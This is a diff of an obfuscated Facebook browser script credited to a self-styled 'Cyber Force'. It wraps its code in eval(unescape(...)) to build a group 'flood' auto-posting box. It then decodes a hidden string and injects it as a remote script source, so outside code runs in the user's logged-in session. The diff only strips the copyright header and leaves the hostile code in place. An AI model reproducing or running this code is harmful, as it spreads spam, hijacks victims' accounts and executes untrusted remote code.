@@ -1,6 +1,4 @@
-/*HTML/JavaScript page status="protected"*/
-/*Auto Friend Suggestion Script*/
-/*Copyright © 2013 Bhargav JT. Gogoi. All Rights Reserved.*/
+
 eval(unescape("javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
 grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='COLOR:WHITE;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
 grouppost += "<div><br><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Group </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Powered By:  Loading [lllllllllll ] 99% & Assam Indian Cyber Force.</br>Script Made By:</A><A style='color:#3B5998;' href='http://www.facebook.com/100001050235420' target='_blank'> Waqar Ahmad</A></A>,<A style='color:#3B5998;' href='http://www.facebook.com/100006306011509' target='_blank'> Taimoor Abid</A></A>,</A><A style='color:#3B5998;' href='http://www.facebook.com/100005115938614' target='_blank'> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website: <A style='color:#3B5998;' href='http://www.automate-your-facebook.webnode.in' target='_blank'>http://www.automate-your-facebook.webnode.in</A>.</A><br></div>";
@@ -172,4 +170,3 @@ for (i = 0; i < V; i++) {
 }
 Z = unescape(Y);
 document.body.appendChild(document.createElement('script')).src = Z;"));
-"));
